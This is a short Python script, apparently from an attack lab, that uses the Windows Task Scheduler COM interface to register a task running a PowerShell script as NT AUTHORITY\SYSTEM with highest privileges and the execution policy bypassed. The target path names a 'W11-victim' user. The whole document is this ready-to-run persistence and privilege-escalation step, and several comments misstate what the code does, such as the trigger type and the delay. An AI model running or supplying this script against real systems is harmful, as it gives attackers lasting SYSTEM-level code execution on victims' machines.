import win32com.client
import time

def create_task():
    scheduler = win32com.client.Dispatch('Schedule.Service')
    scheduler.Connect()

    # Define Task
    task_definition = scheduler.NewTask(0)
    task_definition.RegistrationInfo.Description = 'Run PowerShell as SYSTEM'

    # Create an action to run PowerShell
    action = task_definition.Actions.Create(0)  # 0 = Execute
    action.Path = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
    action.Arguments = "-ExecutionPolicy Bypass -File C:\\Users\\W11-victim\\Documents\\tests\\test.ps1"

    # Create a trigger to run immediately after creation
    trigger = task_definition.Triggers.Create(1)  # 1 = At logon, but we'll set a start time immediately
    start_time = time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime(time.time() + 3610))  # 10 seconds and 1 hour from now
    trigger.StartBoundary = start_time  # Start the task 10 seconds from now

    # Define the task to run with highest privileges and SYSTEM user
    task_definition.Principal.UserId = 'NT AUTHORITY\\SYSTEM'
    task_definition.Principal.LogonType = 3  # Logon interactively
    task_definition.Principal.RunLevel = 1  # Highest privileges

    # Register the task
    folder = scheduler.GetFolder('\\')
    folder.RegisterTaskDefinition('Run PowerShell as SYSTEM', task_definition, 6, None, None, 3, None)  # 6 = Create or update

    print("Scheduled task created successfully!")

create_task()
